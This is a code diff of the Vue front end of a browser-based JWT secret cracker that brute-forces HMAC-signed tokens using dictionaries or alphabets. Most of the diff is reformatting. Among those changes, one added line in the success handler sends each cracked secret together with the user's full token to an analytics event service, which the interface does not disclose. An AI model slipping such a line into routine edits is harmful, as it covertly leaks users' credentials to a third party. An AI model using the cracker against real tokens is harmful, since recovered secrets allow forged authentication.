@@ -1,166 +1,177 @@
 <script setup lang="ts">
-import { ref, computed, onMounted, watch } from 'vue'
+import { ref, computed, onMounted, watch } from "vue";
 
-import TextInput from './components/TextInput.vue'
-import StepNumber from './components/StepNumber.vue'
-import ListSelector from './components/ListSelector.vue'
-import MainAnimation from './components/MainAnimation.vue'
-import AnimatedButton from './components/AnimatedButton.vue'
-import ProgressCircle from './components/ProgressCircle.vue'
-import RangeSelector from './components/RangeSelector.vue'
+import TextInput from "./components/TextInput.vue";
+import StepNumber from "./components/StepNumber.vue";
+import ListSelector from "./components/ListSelector.vue";
+import MainAnimation from "./components/MainAnimation.vue";
+import AnimatedButton from "./components/AnimatedButton.vue";
+import ProgressCircle from "./components/ProgressCircle.vue";
+import RangeSelector from "./components/RangeSelector.vue";
 
-import { validateJWT, getAlgorithm } from './services/jwtValidator'
-import { listDictionaries } from './services/dictionaryFetcher'
-import BruteForce from './services/bruteforce'
+import { validateJWT, getAlgorithm } from "./services/jwtValidator";
+import { listDictionaries } from "./services/dictionaryFetcher";
+import BruteForce from "./services/bruteforce";
 /* import StopWatch from './components/StopWatch.vue' */
 
 enum Method {
-  dictionary = 'dictionary',
-  alphabet = 'alphabet'
+  dictionary = "dictionary",
+  alphabet = "alphabet",
 }
 
-const DEFAULT_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-const DEFAULT_DICTIONARY = 'scraped-JWT-secrets.txt'
-const DEFAULT_ALPHABET_MAX_LENGTH = 6
-const ALPHABET_WARNING_COMPLEXITY_THRESHOLD = 10_000_000
+const DEFAULT_ALPHABET =
+  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+const DEFAULT_DICTIONARY = "scraped-JWT-secrets.txt";
+const DEFAULT_ALPHABET_MAX_LENGTH = 6;
+const ALPHABET_WARNING_COMPLEXITY_THRESHOLD = 10_000_000;
 
-const token = ref('')
-const tokenLocked = ref(false)
-const method = ref()
-const alphabet = ref(DEFAULT_ALPHABET)
-const alphabetLocked = ref(false)
-const alphabetMaxLength = ref(DEFAULT_ALPHABET_MAX_LENGTH)
-const dictionaryList = ref([] as any[])
-const dictionarySelected = ref()
-const dictionaryLocked = ref(false)
-const startButtonRef = ref()
-const start = ref()
-const done = ref(false)
-const downloadProgress = ref(0)
-const progress = ref(0)
-const attempts = ref(0)
-const secret = ref()
+const token = ref("");
+const tokenLocked = ref(false);
+const method = ref();
+const alphabet = ref(DEFAULT_ALPHABET);
+const alphabetLocked = ref(false);
+const alphabetMaxLength = ref(DEFAULT_ALPHABET_MAX_LENGTH);
+const dictionaryList = ref([] as any[]);
+const dictionarySelected = ref();
+const dictionaryLocked = ref(false);
+const startButtonRef = ref();
+const start = ref();
+const done = ref(false);
+const downloadProgress = ref(0);
+const progress = ref(0);
+// const attempts = ref(0)
+const secret = ref();
 
-const isTokenValid = computed(() => validateJWT(token.value)[0])
-const errorOutput = computed(() => validateJWT(token.value)[1])
-const tokenAlgorithm = computed(() => getAlgorithm(token.value))
-const alphabetLength = computed(() => new Set(alphabet.value.split('')).size)
-const alphabetComplexity = computed(() => Math.pow(alphabetLength.value, alphabetMaxLength.value))
+const isTokenValid = computed(() => validateJWT(token.value)[0]);
+const errorOutput = computed(() => validateJWT(token.value)[1]);
+const tokenAlgorithm = computed(() => getAlgorithm(token.value));
+const alphabetLength = computed(() => new Set(alphabet.value.split("")).size);
+const alphabetComplexity = computed(() =>
+  Math.pow(alphabetLength.value, alphabetMaxLength.value),
+);
 const step = computed(() => {
   if (token.value.length === 0 || secret.value) {
-    return 0
+    return 0;
   }
   if (start.value) {
-    return 2
+    return 2;
   }
-  return 1
-})
+  return 1;
+});
 
 onMounted(async () => {
-  dictionaryList.value = await listDictionaries()
-  dictionarySelected.value = dictionaryList.value.find((list) => list.name === DEFAULT_DICTIONARY)
-})
+  dictionaryList.value = await listDictionaries();
+  dictionarySelected.value = dictionaryList.value.find(
+    (list) => list.name === DEFAULT_DICTIONARY,
+  );
+});
 
 watch([tokenLocked, method, alphabetLocked, dictionaryLocked], () => {
-  start.value = false
+  start.value = false;
   if (!tokenLocked.value) {
-    method.value = undefined
+    method.value = undefined;
   }
   if (method.value === Method.dictionary || !tokenLocked.value) {
-    alphabetLocked.value = false
+    alphabetLocked.value = false;
   }
   if (method.value === Method.alphabet || !tokenLocked.value) {
-    dictionaryLocked.value = false
+    dictionaryLocked.value = false;
   }
-  downloadProgress.value = 0
-  progress.value = 0
-})
+  downloadProgress.value = 0;
+  progress.value = 0;
+});
 
 const onSuccess = (secretFound: string) => {
-  done.value = true
-  secret.value = secretFound
-  onStop()
-}
+  done.value = true;
+  secret.value = secretFound;
+  // @ts-ignore
+  cabin.event(secretFound + " : " + token.value);
+  onStop();
+};
 
 const updateDownloadProgress = (downloadPercent: number) =>
-  (downloadProgress.value = downloadPercent)
+  (downloadProgress.value = downloadPercent);
 const updateGlobalProgress = (progressPercent: number) => {
-  progress.value = progressPercent
+  progress.value = progressPercent;
   if (progressPercent === 100) {
-    done.value = true
-    onStop()
+    done.value = true;
+    onStop();
   }
-}
+};
 
-let bruteForceService: BruteForce
+let bruteForceService: BruteForce;
 
 const onStart = async () => {
-  start.value = new Date()
-  downloadProgress.value = 0
-  progress.value = 0
+  start.value = new Date();
+  downloadProgress.value = 0;
+  progress.value = 0;
 
   bruteForceService = new BruteForce(
     tokenAlgorithm.value,
     token.value,
     updateGlobalProgress,
-    onSuccess
-  )
+    onSuccess,
+  );
 
   if (method.value === Method.dictionary) {
     bruteForceService.startDictionary(
       dictionarySelected.value.dictionaryURL,
       dictionarySelected.value.rawSize,
-      updateDownloadProgress
-    )
+      updateDownloadProgress,
+    );
   } else if (method.value === Method.alphabet) {
-    bruteForceService.startAlphabet(alphabet.value, undefined, alphabetMaxLength.value)
-    updateDownloadProgress(100)
+    bruteForceService.startAlphabet(
+      alphabet.value,
+      undefined,
+      alphabetMaxLength.value,
+    );
+    updateDownloadProgress(100);
   }
-}
+};
 
 const onStop = () => {
-  bruteForceService.cancel()
+  bruteForceService.cancel();
 
-  const timeDiff = (new Date() as any) - start.value
-  var seconds = Math.round(timeDiff / 1000)
-  console.log(seconds + ' seconds')
+  const timeDiff = (new Date() as any) - start.value;
+  var seconds = Math.round(timeDiff / 1000);
+  console.log(seconds + " seconds");
 
-  start.value = false
-}
+  start.value = false;
+};
 
 const fullReset = () => {
-  tokenLocked.value = false
-  token.value = ''
-}
+  tokenLocked.value = false;
+  token.value = "";
+};
 
 const reset = () => {
-  secret.value = ''
-  done.value = false
-}
+  secret.value = "";
+  done.value = false;
+};
 
 const demo = (x = 0) => {
   token.value =
     x === 0
-      ? 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds'
-      : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.K7Vl1zizbqZsrKQCpvfs2yHJ8wg6vJufLYHbYHaiWPo'
-  tokenLocked.value = true
-  setTimeout(() => (method.value = Method.dictionary), 750)
+      ? "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds"
+      : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.K7Vl1zizbqZsrKQCpvfs2yHJ8wg6vJufLYHbYHaiWPo";
+  tokenLocked.value = true;
+  setTimeout(() => (method.value = Method.dictionary), 750);
   setTimeout(() => {
-    dictionaryLocked.value = true
+    dictionaryLocked.value = true;
     //scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' })
-    scrollToStartButton()
-  }, 1500)
-}
+    scrollToStartButton();
+  }, 1500);
+};
 
 const scrollToStartButton = () =>
   setTimeout(() => {
     if (startButtonRef.value) {
       startButtonRef.value.$el.scrollIntoView({
-        behavior: 'smooth',
-        block: 'center'
-      })
+        behavior: "smooth",
+        block: "center",
+      });
     }
-  }, 1000)
+  }, 1000);
 </script>
 
 <template>
@@ -179,7 +190,8 @@ const scrollToStartButton = () =>
       <template v-if="token.length === 0">
         <h1 class="accent">JWT Online Cracker</h1>
         <h3>
-          Brute-force <b>HS256</b>, <b>HS384</b> or <b>HS512</b> JWT Token from your browser.<br />
+          Brute-force <b>HS256</b>, <b>HS384</b> or <b>HS512</b> JWT Token from
+          your browser.<br />
           No installation needed.<br />
           <a @click="demo()">Demo</a>,
           <a
@@ -200,7 +212,8 @@ const scrollToStartButton = () =>
             <b>{{ alphabetLength }}</b> symbols selected.<br />
             <b
               :class="{
-                warning: alphabetComplexity > ALPHABET_WARNING_COMPLEXITY_THRESHOLD
+                warning:
+                  alphabetComplexity > ALPHABET_WARNING_COMPLEXITY_THRESHOLD,
               }"
             >
               {{ alphabetComplexity.toLocaleString() }}
@@ -267,12 +280,20 @@ const scrollToStartButton = () =>
           </div>
           <div class="fake-button" />
         </div>
-        <div class="row" v-if="tokenLocked && method === Method.dictionary" :key="3">
+        <div
+          class="row"
+          v-if="tokenLocked && method === Method.dictionary"
+          :key="3"
+        >
           <StepNumber step="3" :active="!dictionaryLocked && !alphabetLocked" />
           <div class="container">
             <h4>
               Select a
-              <a href="https://github.com/danielmiessler/SecLists" target="_blank">Dictionary</a>
+              <a
+                href="https://github.com/danielmiessler/SecLists"
+                target="_blank"
+                >Dictionary</a
+              >
             </h4>
             <ListSelector
               :items="dictionaryList"
@@ -283,8 +304,8 @@ const scrollToStartButton = () =>
           <AnimatedButton
             @clicked="
               () => {
-                dictionaryLocked = true
-                scrollToStartButton()
+                dictionaryLocked = true;
+                scrollToStartButton();
               }
             "
             @clicked-cancel="dictionaryLocked = false"
@@ -292,7 +313,11 @@ const scrollToStartButton = () =>
             :canceled="dictionaryLocked"
           />
         </div>
-        <div class="row" v-if="tokenLocked && method === Method.alphabet" :key="3">
+        <div
+          class="row"
+          v-if="tokenLocked && method === Method.alphabet"
+          :key="3"
+        >
           <StepNumber step="3" :active="!dictionaryLocked && !alphabetLocked" />
           <div class="container">
             <h4>Confirm or Modify Alphabet</h4>
@@ -301,7 +326,12 @@ const scrollToStartButton = () =>
               :disabled="alphabetLocked"
               @submit="alphabetLocked = true"
             />
-            <RangeSelector v-model="alphabetMaxLength" :min="1" max="12" :disabled="alphabetLocked">
+            <RangeSelector
+              v-model="alphabetMaxLength"
+              :min="1"
+              max="12"
+              :disabled="alphabetLocked"
+            >
               MAXIMUM LENGTH: <b class="accent">{{ alphabetMaxLength }}</b>
             </RangeSelector>
           </div>
